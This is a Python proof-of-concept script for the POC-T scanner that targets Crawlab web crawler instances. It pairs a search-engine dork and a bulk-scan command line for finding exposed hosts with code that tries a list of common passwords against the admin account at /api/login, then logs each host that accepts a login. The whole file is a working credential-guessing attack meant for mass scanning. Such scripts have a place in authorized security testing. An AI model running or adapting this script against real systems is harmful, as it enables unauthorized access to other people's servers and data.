#!/usr/bin/env python
# -*- encoding: utf-8 -*-
'''
@File    :   Crawlab_weak_pass.py
@DateTime :  2023/9/10 16:00

@Dork
    title=="Crawlab | Distributed Web Crawler Platform"

@Cmdline
    python POC-T.py -s Crawlab_weak_pass.py -aF title=="Crawlab | Distributed Web Crawler Platform"


@Request
```
POST /api/login

{"username":"admin","password":"admin"}
```

@Expected Response
    not 401
'''
import json

from lib.utils.http import request_ex, get_http_url, urljoin_ex
from lib.utils.dic import Wordlist
from lib.core.data import logger as log


def poc(url):
    url = urljoin_ex(url, "/api/login")

    for pwd in Wordlist.top_10_pass:
        post_data = {"username": "admin", "password": pwd}
        resp = request_ex("post", url=url, json=post_data, timeout=8)
        if resp and resp.status_code != 401:
            msg = "%s\t %s" % (url, json.dumps(post_data))
            log.success(msg)
            return True
        else:
            continue

    # finally
    return False

